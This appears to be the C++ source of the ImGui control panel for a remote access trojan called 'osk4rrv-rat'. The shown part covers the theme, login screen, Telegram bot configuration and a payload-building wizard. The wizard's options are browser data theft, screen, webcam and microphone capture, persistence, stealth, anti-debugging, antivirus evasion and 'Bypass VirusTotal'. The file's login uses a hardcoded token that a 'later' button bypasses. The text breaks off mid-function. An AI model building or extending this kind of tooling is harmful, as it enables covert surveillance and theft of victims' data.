#include "imgui.h"
#include "imgui_impl_win32.h"
#include "imgui_impl_dx11.h"
#include "rat.h"
#include "IconsFontAwesome6.h"
#include <d3d11.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <ctime>
#include <fstream>
#include <algorithm>
#include <cmath>
#include <random>
#include <set>
#include <shlobj.h>
#include <commdlg.h>
#include <cstring>
#include <cstdio>

#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "d3dcompiler.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comdlg32.lib")

static ID3D11Device*            g_pd3dDevice = nullptr;
static ID3D11DeviceContext*     g_pd3dDeviceContext = nullptr;
static IDXGISwapChain*          g_pSwapChain = nullptr;
static ID3D11RenderTargetView*  g_mainRenderTargetView = nullptr;
static HWND                     g_hwnd = nullptr;

bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void CreateRenderTarget();
void CleanupRenderTarget();

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

static bool g_dragging = false;
static POINT g_dragStart = {};
static RECT  g_windowStart = {};

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg) {
    case WM_SIZE:
        if (g_pd3dDevice != nullptr && wParam != SIZE_MINIMIZED) {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

static char botTokenBuf[512] = "";
static char chatIdBuf[64] = "";
static char authTokenBuf[256] = "";
static TelegramBot telegram;
static bool configLoaded = false;
static bool authLoggedIn = false;
static bool showTelegramPopup = false;
static bool showAuthLogin = false;
static bool showAuthFailPopup = false;
static bool authCheckDone = false;
static bool authCheckStarted = false;
static bool authenticating = false;
static float authStartTime = 0.0f;
static int  currentTab = 0;
static bool requestClose = false;
static bool requestMinimize = false;
static std::string sessionId;
static std::string lastTestMessage;
static bool showNotConfiguredWarning = false;
static bool showBuildPopup = false;
static int buildWizardStep = 0; // 0 = select exe, 1 = options, 2 = success
static float buildWizardAnim = 0.0f;
static float buildWizardStepAnim = 1.0f;
static int buildWizardStepFrom = 0;
static char selectedExePath[MAX_PATH] = "";
static char selectedExeName[MAX_PATH] = "";
static int updateIntervalDays = 0;
static int micDurationSec = 10;
static int webcamDurationSec = 10;
static int screenDurationSec = 10;
static char buildStatusMsg[512] = "";
static bool buildOptions[11] = { true, true, false, true, true, false, false, false, false, false, false };
static const char* buildOptionLabels[11] = {
    "Grab browser data",
    "Screenshot + screen record",
    "Auto-start",
    "Grab webcam",
    "Grab microphone",
    "Bypass VirusTotal",
    "Stealth mode",
    "Persistence",
    "Anti-debugging",
    "Encrypt network traffic",
    "Anti-antivirus"
};
static ImFont* fontBody = nullptr;
static ImFont* fontMedium = nullptr;
static ImFont* fontHeading = nullptr;
static ImFont* fontSplash = nullptr;
static ImFont* fontIcons = nullptr;
static bool showSplash = true;
static float splashStartTime = 0.0f;
static float splashProgress = 0.0f;
static const float SPLASH_DURATION = 3.2f; // seconds
static const int WIN_W = 760;
static const int WIN_H = 500;

static std::string generateSessionId() {
    static constexpr char alphabet[] = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    std::random_device random;
    std::uniform_int_distribution<size_t> pick(0, sizeof(alphabet) - 2);

    std::string id;
    id.reserve(11);
    for (int index = 0; index < 9; ++index) {
        if (index > 0 && index % 3 == 0)
            id.push_back('-');
        id.push_back(alphabet[pick(random)]);
    }
    return id;
}

static std::string getAppDataPath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        std::string dir = std::string(path) + "\\AppDataCfg";
        CreateDirectoryA(dir.c_str(), nullptr);
        return dir + "\\config.ini";
    }
    return "config.ini";
}

static void saveConfigToAppData() {
    std::ofstream f(getAppDataPath());
    if (f.is_open()) {
        f << "token=" << botTokenBuf << "\n";
        f << "chatid=" << chatIdBuf << "\n";
        f << "authtoken=" << authTokenBuf << "\n";
        f.close();
        configLoaded = true;
        telegram.setConfig(botTokenBuf, chatIdBuf);
    }
}

static void loadConfigFromAppData() {
    std::ifstream f(getAppDataPath());
    if (!f.is_open()) return;
    std::string line;
    while (std::getline(f, line)) {
        if (line.rfind("token=", 0) == 0) {
            std::string val = line.substr(6);
            strncpy_s(botTokenBuf, val.c_str(), sizeof(botTokenBuf) - 1);
        } else if (line.rfind("chatid=", 0) == 0) {
            std::string val = line.substr(7);
            strncpy_s(chatIdBuf, val.c_str(), sizeof(chatIdBuf) - 1);
        } else if (line.rfind("authtoken=", 0) == 0) {
            std::string val = line.substr(10);
            strncpy_s(authTokenBuf, val.c_str(), sizeof(authTokenBuf) - 1);
        }
    }
    f.close();
    if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
        telegram.setConfig(botTokenBuf, chatIdBuf);
        configLoaded = true;
    }
}

static void resetConfig() {
    botTokenBuf[0] = 0;
    chatIdBuf[0] = 0;
    configLoaded = false;
    authLoggedIn = false;
    authTokenBuf[0] = 0;
    telegram.reset();
    DeleteFileA(getAppDataPath().c_str());
}

namespace Ui {
    static constexpr float TitleBarHeight = 56.0f;
    static constexpr float FooterHeight = 40.0f;
    static constexpr float SidebarWidth = 168.0f;
    static constexpr float ContentPadding = 24.0f;

    // Premium dark + champagne gold. Solid surfaces only.
    static const ImVec4 Canvas        = ImVec4(0.047f, 0.047f, 0.051f, 1.0f); // #0C0C0D
    static const ImVec4 Chrome        = ImVec4(0.071f, 0.071f, 0.078f, 1.0f); // #121214
    static const ImVec4 Sidebar       = ImVec4(0.059f, 0.059f, 0.065f, 1.0f); // #0F0F11
    static const ImVec4 Surface       = ImVec4(0.090f, 0.090f, 0.098f, 1.0f); // #171719
    static const ImVec4 SurfaceRaised = ImVec4(0.118f, 0.118f, 0.129f, 1.0f); // #1E1E21
    static const ImVec4 SurfaceHover  = ImVec4(0.149f, 0.149f, 0.161f, 1.0f); // #262629
    static const ImVec4 Border        = ImVec4(0.176f, 0.176f, 0.188f, 1.0f); // #2D2D30
    static const ImVec4 BorderStrong  = ImVec4(0.235f, 0.235f, 0.251f, 1.0f); // #3C3C40
    static const ImVec4 TextPrimary   = ImVec4(0.953f, 0.949f, 0.941f, 1.0f); // #F3F2F0
    static const ImVec4 TextSecondary = ImVec4(0.620f, 0.612f, 0.588f, 1.0f); // #9E9C96
    static const ImVec4 TextMuted     = ImVec4(0.420f, 0.412f, 0.392f, 1.0f); // #6B6964
    static const ImVec4 Accent        = ImVec4(0.788f, 0.663f, 0.384f, 1.0f); // #C9A962
    static const ImVec4 AccentHover   = ImVec4(0.831f, 0.722f, 0.471f, 1.0f); // #D4B878
    static const ImVec4 AccentPressed = ImVec4(0.690f, 0.569f, 0.290f, 1.0f); // #B0914A
    static const ImVec4 Success       = ImVec4(0.420f, 0.690f, 0.490f, 1.0f);
    static const ImVec4 Warning       = ImVec4(0.820f, 0.650f, 0.320f, 1.0f);
    static const ImVec4 Danger        = ImVec4(0.780f, 0.360f, 0.360f, 1.0f);

    static ImU32 color(const ImVec4& value) {
        return ImGui::ColorConvertFloat4ToU32(value);
    }

    static ImVec4 mix(const ImVec4& a, const ImVec4& b, float t) {
        t = std::clamp(t, 0.0f, 1.0f);
        return ImVec4(
            a.x + (b.x - a.x) * t,
            a.y + (b.y - a.y) * t,
            a.z + (b.z - a.z) * t,
            a.w + (b.w - a.w) * t);
    }
}

struct StatusPresentation {
    const char* label;
    ImVec4 color;
};

static StatusPresentation getStatusPresentation() {
    switch (telegram.getStatus()) {
    case TelegramStatus::Connected:
        return { "Connected", Ui::Success };
    case TelegramStatus::Connecting:
        return { "Connecting", Ui::Warning };
    case TelegramStatus::Failed:
        return { "Connection failed", Ui::Danger };
    default:
        return { "Not connected", Ui::TextMuted };
    }
}

static void applyModernTheme() {
    ImGuiStyle& s = ImGui::GetStyle();

    s.WindowRounding = 10.0f;
    s.ChildRounding = 8.0f;
    s.FrameRounding = 6.0f;
    s.PopupRounding = 10.0f;
    s.ScrollbarRounding = 6.0f;
    s.GrabRounding = 4.0f;
    s.TabRounding = 6.0f;

    s.WindowPadding = ImVec2(0, 0);
    s.FramePadding = ImVec2(11, 8);
    s.ItemSpacing = ImVec2(10, 8);
    s.ItemInnerSpacing = ImVec2(8, 5);
    s.ScrollbarSize = 7.0f;

    s.WindowBorderSize = 0.0f;
    s.ChildBorderSize = 1.0f;
    s.FrameBorderSize = 0.0f;
    s.PopupBorderSize = 1.0f;
    s.TabBorderSize = 0.0f;

    ImVec4* c = s.Colors;
    c[ImGuiCol_WindowBg] = Ui::Canvas;
    c[ImGuiCol_ChildBg] = Ui::Surface;
    c[ImGuiCol_PopupBg] = Ui::Surface;
    c[ImGuiCol_Border] = Ui::Border;
    c[ImGuiCol_BorderShadow] = ImVec4(0.0f, 0.0f, 0.0f, 0.0f); // no black shadow ring on frames/buttons
    c[ImGuiCol_Button] = Ui::SurfaceRaised;
    c[ImGuiCol_ButtonHovered] = Ui::SurfaceHover;
    c[ImGuiCol_ButtonActive] = Ui::BorderStrong;
    c[ImGuiCol_FrameBg] = Ui::SurfaceRaised;
    c[ImGuiCol_FrameBgHovered] = Ui::SurfaceHover;
    c[ImGuiCol_FrameBgActive] = Ui::BorderStrong;
    c[ImGuiCol_TitleBg] = Ui::Chrome;
    c[ImGuiCol_TitleBgActive] = Ui::Chrome;
    c[ImGuiCol_TitleBgCollapsed] = Ui::Chrome;
    c[ImGuiCol_Header] = Ui::SurfaceRaised;
    c[ImGuiCol_HeaderHovered] = Ui::SurfaceHover;
    c[ImGuiCol_HeaderActive] = Ui::BorderStrong;
    c[ImGuiCol_Text] = Ui::TextPrimary;
    c[ImGuiCol_TextDisabled] = Ui::TextMuted;
    c[ImGuiCol_TextSelectedBg] = ImVec4(Ui::Accent.x, Ui::Accent.y, Ui::Accent.z, 0.35f);
    // Default checkmark (wizard uses styledCheckbox for B/W fill)
    c[ImGuiCol_CheckMark] = Ui::TextPrimary;
    c[ImGuiCol_CheckboxSelectedBg] = ImVec4(0.88f, 0.88f, 0.86f, 1.0f); // checked idle (not gold)
    c[ImGuiCol_SliderGrab] = Ui::Accent;
    c[ImGuiCol_SliderGrabActive] = Ui::AccentHover;
    c[ImGuiCol_Separator] = Ui::Border;
    c[ImGuiCol_SeparatorHovered] = Ui::BorderStrong;
    c[ImGuiCol_SeparatorActive] = Ui::Accent;
    c[ImGuiCol_ScrollbarBg] = Ui::Canvas;
    c[ImGuiCol_ScrollbarGrab] = Ui::BorderStrong;
    c[ImGuiCol_ScrollbarGrabHovered] = Ui::TextMuted;
    c[ImGuiCol_ScrollbarGrabActive] = Ui::TextSecondary;
    c[ImGuiCol_NavHighlight] = Ui::Accent;
    c[ImGuiCol_ModalWindowDimBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.78f);
}

static bool drawChromeButton(const char* id, const ImVec2& position, bool closeButton) {
    const ImVec2 size(36.0f, 28.0f);
    ImGui::SetCursorScreenPos(position);
    ImGui::InvisibleButton(id, size);

    const bool hovered = ImGui::IsItemHovered();
    const bool held = ImGui::IsItemActive();
    const bool clicked = ImGui::IsItemClicked(ImGuiMouseButton_Left);
    ImDrawList* dl = ImGui::GetWindowDrawList();

    if (hovered || held) {
        ImVec4 background = closeButton
            ? (held ? ImVec4(0.55f, 0.18f, 0.18f, 1.0f) : ImVec4(0.65f, 0.22f, 0.22f, 1.0f))
            : (held ? Ui::SurfaceRaised : Ui::SurfaceHover);
        dl->AddRectFilled(position, ImVec2(position.x + size.x, position.y + size.y), Ui::color(background), 5.0f);
    }

    const ImU32 glyphColor = Ui::color(hovered ? Ui::TextPrimary : Ui::TextSecondary);
    const float cx = position.x + size.x * 0.5f;
    const float cy = position.y + size.y * 0.5f;
    if (closeButton) {
        dl->AddLine(ImVec2(cx - 4.0f, cy - 4.0f), ImVec2(cx + 4.0f, cy + 4.0f), glyphColor, 1.35f);
        dl->AddLine(ImVec2(cx + 4.0f, cy - 4.0f), ImVec2(cx - 4.0f, cy + 4.0f), glyphColor, 1.35f);
    } else {
        dl->AddLine(ImVec2(cx - 5.0f, cy + 1.0f), ImVec2(cx + 5.0f, cy + 1.0f), glyphColor, 1.35f);
    }
    return clicked;
}

static bool styledButton(const char* label, const ImVec2& size, bool primary) {
    // Flat monochrome — solid fill only, no black shadow/overlay
    const ImVec4 bg = primary ? Ui::SurfaceHover : Ui::Surface;
    const ImVec4 bgHover = primary ? Ui::BorderStrong : Ui::SurfaceRaised;
    const ImVec4 bgActive = primary ? Ui::Border : Ui::SurfaceHover;
    const ImVec4 text = primary ? Ui::TextPrimary : Ui::TextSecondary;
    const ImVec4 border = primary ? Ui::BorderStrong : Ui::Border;
    ImGui::PushStyleColor(ImGuiCol_Button, bg);
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, bgHover);
    ImGui::PushStyleColor(ImGuiCol_ButtonActive, bgActive);
    ImGui::PushStyleColor(ImGuiCol_Text, text);
    ImGui::PushStyleColor(ImGuiCol_Border, border);
    ImGui::PushStyleColor(ImGuiCol_BorderShadow, ImVec4(0.0f, 0.0f, 0.0f, 0.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 6.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(12.0f, 0.0f));
    if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
    const bool clicked = ImGui::Button(label, size);
    if (fontMedium) ImGui::PopFont();
    ImGui::PopStyleVar(3);
    ImGui::PopStyleColor(6);
    return clicked;
}

// Black/white monochrome checkbox (no gold)
static bool styledCheckbox(const char* label, bool* value) {
    const bool on = value && *value;
    // ImGui uses CheckboxSelectedBg for checked idle (not FrameBg)
    const ImVec4 selectedBg = ImVec4(0.88f, 0.88f, 0.86f, 1.0f);
    const ImVec4 frame = Ui::SurfaceRaised;
    const ImVec4 frameHover = on ? Ui::TextPrimary : Ui::SurfaceHover;
    const ImVec4 frameActive = on ? Ui::TextSecondary : Ui::BorderStrong;
    const ImVec4 mark = on ? Ui::Canvas : Ui::TextPrimary;
    const ImVec4 border = on ? ImVec4(0.70f, 0.70f, 0.68f, 1.0f) : Ui::Border;

    ImGui::PushStyleColor(ImGuiCol_FrameBg, frame);
    ImGui::PushStyleColor(ImGuiCol_FrameBgHovered, frameHover);
    ImGui::PushStyleColor(ImGuiCol_FrameBgActive, frameActive);
    ImGui::PushStyleColor(ImGuiCol_CheckboxSelectedBg, selectedBg);
    ImGui::PushStyleColor(ImGuiCol_CheckMark, mark);
    ImGui::PushStyleColor(ImGuiCol_Border, border);
    ImGui::PushStyleColor(ImGuiCol_BorderShadow, ImVec4(0.0f, 0.0f, 0.0f, 0.0f));
    ImGui::PushStyleColor(ImGuiCol_Text, on ? Ui::TextPrimary : Ui::TextSecondary);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 4.0f);
    const bool changed = ImGui::Checkbox(label, value);
    ImGui::PopStyleVar(2);
    ImGui::PopStyleColor(8);
    return changed;
}

static void handleWindowDrag(const ImVec2& dragAreaPos, const ImVec2& dragAreaSize) {
    ImGui::SetCursorScreenPos(dragAreaPos);
    ImGui::InvisibleButton("##titlebar_drag", dragAreaSize);
    if (ImGui::IsItemActive() && ImGui::IsMouseDragging(ImGuiMouseButton_Left)) {
        if (!g_dragging) {
            g_dragging = true;
            GetCursorPos(&g_dragStart);
            GetWindowRect(g_hwnd, &g_windowStart);
        }
        POINT current;
        GetCursorPos(&current);
        SetWindowPos(
            g_hwnd,
            nullptr,
            g_windowStart.left + (current.x - g_dragStart.x),
            g_windowStart.top + (current.y - g_dragStart.y),
            0,
            0,
            SWP_NOSIZE | SWP_NOZORDER);
    } else {
        g_dragging = false;
    }
}

static void drawTitleBar() {
    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetCursorScreenPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddRectFilled(
        p0,
        ImVec2(p0.x + winSize.x, p0.y + Ui::TitleBarHeight),
        Ui::color(Ui::Chrome),
        10.0f,
        ImDrawFlags_RoundCornersTop);
    dl->AddLine(
        ImVec2(p0.x, p0.y + Ui::TitleBarHeight - 1.0f),
        ImVec2(p0.x + winSize.x, p0.y + Ui::TitleBarHeight - 1.0f),
        Ui::color(Ui::Border));

    handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, Ui::TitleBarHeight));

    // Brand block top-left
    ImFont* brandFont = fontMedium ? fontMedium : ImGui::GetFont();
    dl->AddText(
        brandFont,
        brandFont->LegacySize + 1.0f,
        ImVec2(p0.x + 20.0f, p0.y + 12.0f),
        Ui::color(Ui::TextPrimary),
        "osk4rrv-rat");
    dl->AddText(
        fontBody ? fontBody : ImGui::GetFont(),
        (fontBody ? fontBody->LegacySize : ImGui::GetFontSize()) - 1.0f,
        ImVec2(p0.x + 20.0f, p0.y + 32.0f),
        Ui::color(Ui::TextMuted),
        "Version V1.0");

    // thin gold mark
    dl->AddRectFilled(
        ImVec2(p0.x, p0.y + 14.0f),
        ImVec2(p0.x + 2.0f, p0.y + Ui::TitleBarHeight - 14.0f),
        Ui::color(Ui::Accent),
        1.0f);

    if (drawChromeButton(
            "##window_minimize",
            ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f),
            false)) {
        requestMinimize = true;
    }
    if (drawChromeButton(
            "##window_close",
            ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f),
            true)) {
        requestClose = true;
    }

    ImGui::SetCursorScreenPos(ImVec2(p0.x, p0.y + Ui::TitleBarHeight));
}

static void drawFooter() {
    const ImVec2 winPos = ImGui::GetWindowPos();
    const ImVec2 winSize = ImGui::GetWindowSize();
    ImDrawList* dl = ImGui::GetWindowDrawList();
    const float y0 = winPos.y + winSize.y - Ui::FooterHeight;

    dl->AddRectFilled(
        ImVec2(winPos.x, y0),
        ImVec2(winPos.x + winSize.x, winPos.y + winSize.y),
        Ui::color(Ui::Chrome),
        10.0f,
        ImDrawFlags_RoundCornersBottom);
    dl->AddLine(
        ImVec2(winPos.x, y0),
        ImVec2(winPos.x + winSize.x, y0),
        Ui::color(Ui::Border));

    const StatusPresentation status = getStatusPresentation();
    const float textY = y0 + 12.0f;

    // left: telegram endpoint status
    dl->AddCircleFilled(ImVec2(winPos.x + 22.0f, textY + 6.0f), 3.5f, Ui::color(status.color));
    char leftBuf[128];
    snprintf(leftBuf, sizeof(leftBuf), "Telegram  %s", status.label);
    dl->AddText(
        fontBody ? fontBody : ImGui::GetFont(),
        fontBody ? fontBody->LegacySize : ImGui::GetFontSize(),
        ImVec2(winPos.x + 32.0f, textY),
        Ui::color(Ui::TextSecondary),
        leftBuf);

    // right: session id
    char rightBuf[96];
    snprintf(rightBuf, sizeof(rightBuf), "Session  %s", sessionId.c_str());
    ImFont* f = fontBody ? fontBody : ImGui::GetFont();
    float fs = fontBody ? fontBody->LegacySize : ImGui::GetFontSize();
    ImVec2 rs = f->CalcTextSizeA(fs, FLT_MAX, 0.0f, rightBuf);
    dl->AddText(
        f,
        fs,
        ImVec2(winPos.x + winSize.x - 20.0f - rs.x, textY),
        Ui::color(Ui::TextMuted),
        rightBuf);
}

static bool verifyAuthToken(const char* token) {
    if (!token || !token[0]) return false;
    return strcmp(token, "admin-token-1234") == 0;
}

static void drawAuthLoginScreen() {
    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetWindowPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), 10.0f);
    handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, 50.0f));
    ImGui::SetCursorScreenPos(p0);
    ImGui::Dummy(winSize);
    if (drawChromeButton("##auth_min", ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f), false))
        requestMinimize = true;
    if (drawChromeButton("##auth_close", ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f), true))
        requestClose = true;

    const float centerX = p0.x + winSize.x * 0.5f;
    const float centerY = p0.y + winSize.y * 0.5f;

    ImFont* big = fontSplash ? fontSplash : (fontHeading ? fontHeading : ImGui::GetFont());
    const char* title = "Authentication";
    float titleSize = fontSplash ? fontSplash->LegacySize : 28.0f;
    ImVec2 titleSz = big->CalcTextSizeA(titleSize, FLT_MAX, 0.0f, title);
    dl->AddText(big, titleSize, ImVec2(centerX - titleSz.x * 0.5f, centerY - 120.0f), Ui::color(Ui::TextPrimary), title);

    float lineW = 48.0f;
    float lineY = centerY - 120.0f + titleSz.y + 14.0f;
    dl->AddRectFilled(
        ImVec2(centerX - lineW * 0.5f, lineY),
        ImVec2(centerX + lineW * 0.5f, lineY + 2.0f),
        Ui::color(Ui::Accent), 1.0f);

    ImFont* body = fontBody ? fontBody : ImGui::GetFont();
    const char* subtitle = "Enter your access token to continue";
    float subSize = body->LegacySize;
    ImVec2 subSz = body->CalcTextSizeA(subSize, FLT_MAX, 0.0f, subtitle);
    dl->AddText(body, subSize, ImVec2(centerX - subSz.x * 0.5f, lineY + 20.0f), Ui::color(Ui::TextMuted), subtitle);

    ImGui::SetCursorPos(ImVec2(winSize.x * 0.5f - 140.0f, winSize.y * 0.5f - 10.0f));
    ImGui::PushStyleColor(ImGuiCol_FrameBg, Ui::SurfaceRaised);
    ImGui::PushStyleColor(ImGuiCol_FrameBgHovered, Ui::SurfaceHover);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::BorderStrong);
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 8.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(14.0f, 12.0f));
    ImGui::SetNextItemWidth(280.0f);
    ImGui::InputText("##auth_input", authTokenBuf, sizeof(authTokenBuf), ImGuiInputTextFlags_Password);
    ImGui::PopStyleVar(2);
    ImGui::PopStyleColor(4);

    ImGui::SetCursorPos(ImVec2(winSize.x * 0.5f - 70.0f, winSize.y * 0.5f + 40.0f));
    if (authenticating) {
        if (authStartTime <= 0.0f)
            authStartTime = (float)ImGui::GetTime();
        float at = ((float)ImGui::GetTime() - authStartTime) / 1.8f;
        if (at >= 1.0f) {
            authenticating = false;
            authLoggedIn = true;
            saveConfigToAppData();
            authStartTime = 0.0f;
        } else {
            const float barW = 140.0f;
            const float barH = 3.0f;
            float barX = p0.x + winSize.x * 0.5f - barW * 0.5f;
            float barY = p0.y + winSize.y * 0.5f + 50.0f;
            dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW, barY + barH), Ui::color(Ui::SurfaceRaised), 2.0f);
            dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW * at, barY + barH), Ui::color(Ui::Accent), 2.0f);
            const char* authPhase = "Authenticating...";
            ImVec2 apSz = body->CalcTextSizeA(subSize, FLT_MAX, 0.0f, authPhase);
            dl->AddText(body, subSize, ImVec2(p0.x + (winSize.x - apSz.x) * 0.5f, barY + 14.0f), Ui::color(Ui::TextMuted), authPhase);
        }
    } else if (styledButton("Login", ImVec2(140.0f, 40.0f), true)) {
        if (verifyAuthToken(authTokenBuf)) {
            authenticating = true;
            authStartTime = 0.0f;
        } else {
            showAuthFailPopup = true;
        }
    }
}

static void drawAuthFailPopup() {
    if (!showAuthFailPopup) return;
    ImGui::OpenPopup("Auth failed##modal");
    const ImVec2 center = ImGui::GetMainViewport()->GetCenter();
    ImGui::SetNextWindowPos(center, ImGuiCond_Appearing, ImVec2(0.5f, 0.5f));
    ImGui::SetNextWindowSize(ImVec2(420.0f, 220.0f), ImGuiCond_Appearing);

    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(28.0f, 25.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 12.0f);
    ImGui::PushStyleColor(ImGuiCol_PopupBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::BorderStrong);

    if (ImGui::BeginPopupModal("Auth failed##modal", &showAuthFailPopup,
            ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove |
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::Danger);
        ImGui::TextUnformatted("Authentication failed");
        if (fontHeading) ImGui::PopFont();
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 8.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("The access token you entered is invalid.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 20.0f));
        float btnW = 120.0f;
        float gap = 10.0f;
        if (styledButton("Edit", ImVec2(btnW, 40.0f), true)) {
            showAuthFailPopup = false;
            ImGui::CloseCurrentPopup();
        }
        ImGui::SameLine(0.0f, gap);
        if (styledButton("I'll do that later", ImVec2(180.0f, 40.0f), false)) {
            showAuthFailPopup = false;
            authLoggedIn = true;
            ImGui::CloseCurrentPopup();
        }
        ImGui::EndPopup();
    }
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar(2);
}

static bool drawNavItem(const char* id, const char* label, int tabIndex, float y) {
    const float width = Ui::SidebarWidth - 20.0f;
    ImGui::SetCursorPos(ImVec2(10.0f, y));
    ImGui::InvisibleButton(id, ImVec2(width, 38.0f));

    const bool hovered = ImGui::IsItemHovered();
    const bool selected = currentTab == tabIndex;
    if (ImGui::IsItemClicked(ImGuiMouseButton_Left))
        currentTab = tabIndex;

    static float animation[3] = { 1.0f, 0.0f, 0.0f };
    const float target = selected ? 1.0f : (hovered ? 0.45f : 0.0f);
    const float step = 1.0f - std::exp(-16.0f * ImGui::GetIO().DeltaTime);
    animation[tabIndex] += (target - animation[tabIndex]) * step;

    const ImVec2 screenPos = ImGui::GetItemRectMin();
    const ImVec2 screenMax = ImGui::GetItemRectMax();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    if (animation[tabIndex] > 0.01f) {
        dl->AddRectFilled(
            screenPos,
            screenMax,
            Ui::color(Ui::mix(Ui::Sidebar, Ui::SurfaceRaised, animation[tabIndex] * 0.85f)),
            6.0f);
        dl->AddRectFilled(
            ImVec2(screenPos.x, screenPos.y + 9.0f),
            ImVec2(screenPos.x + 2.5f, screenPos.y + 29.0f),
            Ui::color(Ui::mix(Ui::Sidebar, Ui::Accent, animation[tabIndex])),
            1.0f);
    }

    ImFont* navFont = fontMedium ? fontMedium : ImGui::GetFont();
    const ImVec4 textColor = selected
        ? Ui::TextPrimary
        : Ui::mix(Ui::TextMuted, Ui::TextSecondary, animation[tabIndex]);
    const float textY = screenPos.y + (38.0f - navFont->LegacySize) * 0.5f - 1.0f;
    dl->AddText(
        navFont,
        navFont->LegacySize,
        ImVec2(screenPos.x + 16.0f, textY),
        Ui::color(textColor),
        label);
    return selected;
}

static void drawSidebar() {
    const ImVec2 winPos = ImGui::GetWindowPos();
    const ImVec2 winSize = ImGui::GetWindowSize();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddLine(
        ImVec2(winPos.x + winSize.x - 1.0f, winPos.y),
        ImVec2(winPos.x + winSize.x - 1.0f, winPos.y + winSize.y),
        Ui::color(Ui::Border));

    ImGui::SetCursorPos(ImVec2(16.0f, 18.0f));
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
    ImGui::TextUnformatted("MENU");
    ImGui::PopStyleColor();

    drawNavItem("##nav_overview", "Home", 0, 44.0f);
    drawNavItem("##nav_build", "Build", 1, 88.0f);
    drawNavItem("##nav_integrations", "Telegram", 2, 132.0f);
}

static void drawPageHeader(const char* title, const char* subtitle) {
    const float width = ImGui::GetWindowSize().x;

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 18.0f));
    if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
    ImGui::TextUnformatted(title);
    ImGui::PopStyleColor();
    if (fontHeading) ImGui::PopFont();

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 46.0f));
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
    ImGui::TextUnformatted(subtitle);
    ImGui::PopStyleColor();

    ImDrawList* dl = ImGui::GetWindowDrawList();
    const ImVec2 pos = ImGui::GetWindowPos();
    dl->AddLine(
        ImVec2(pos.x + Ui::ContentPadding, pos.y + 72.0f),
        ImVec2(pos.x + width - Ui::ContentPadding, pos.y + 72.0f),
        Ui::color(Ui::Border));
}

static void drawSplashScreen() {
    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetWindowPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    // solid fill
    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), 10.0f);

    // drag whole splash
    handleWindowDrag(p0, winSize);

    // close / min on splash too
